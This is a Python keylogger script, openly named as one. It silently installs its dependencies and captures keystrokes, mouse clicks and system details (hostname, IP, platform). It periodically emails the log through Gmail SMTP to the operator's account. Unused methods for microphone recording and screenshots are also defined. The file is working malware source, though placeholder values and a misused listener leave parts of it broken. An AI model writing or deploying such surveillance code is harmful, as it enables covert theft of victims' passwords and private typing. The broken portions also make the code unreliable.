try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    EMAIL_ADDRESS = "@@@@@@@@@@@@@@@@@@"  # Replace with your email
    EMAIL_PASSWORD = "@@"  # Replace with your password
    SEND_REPORT_EVERY = @@  # Interval in seconds for sending reports

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started...\n"
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log += string

        def on_move(self, x, y):
            self.appendlog(f"Mouse moved to ({x}, {y})\n")

        def on_click(self, x, y, button, pressed):
            action = "pressed" if pressed else "released"
            self.appendlog(f"Mouse {action} at ({x}, {y}) with {button}\n")

        def on_scroll(self, x, y, dx, dy):
            self.appendlog(f"Mouse scrolled at ({x}, {y}) by ({dx}, {dy})\n")

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = f"[{key}]"
            self.appendlog(current_key + "\n")

        def send_mail(self, email, password, message):
            try:
                # SMTP configuration for Gmail
                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(email, password)
                    subject = "Keylogger Report"
                    msg = f"Subject: {subject}\n\n{message}"
                    server.sendmail(email, email, msg)
            except Exception as e:
                print(f"Error sending email: {e}")

        def report(self):
            if self.log:
                self.send_mail(self.email, self.password, self.log)
                self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            sys_info = f"""
            Hostname: {hostname}
            IP Address: {ip}
            Processor: {plat}
            System: {system}
            Machine: {machine}\n
            """
            self.appendlog(sys_info)

        def microphone(self):
            try:
                fs = 44100
                seconds = self.interval
                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                sd.wait()
                file_path = "sound.wav"
                with wave.open(file_path, 'wb') as obj:
                    obj.setnchannels(2)
                    obj.setsampwidth(2)
                    obj.setframerate(fs)
                    obj.writeframes(myrecording.tobytes())
                self.appendlog("Microphone recording saved.\n")
            except Exception as e:
                self.appendlog(f"Error recording microphone: {e}\n")

        def screenshot(self):
            try:
                file_path = "screenshot.png"
                img = pyscreenshot.grab()
                img.save(file_path)
                self.appendlog("Screenshot taken.\n")
            except Exception as e:
                self.appendlog(f"Error taking screenshot: {e}\n")

        def run(self):
            self.system_information()
            self.report()
            with Listener(on_press=self.save_data, on_click=self.on_click, on_scroll=self.on_scroll) as listener:
                listener.join()

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
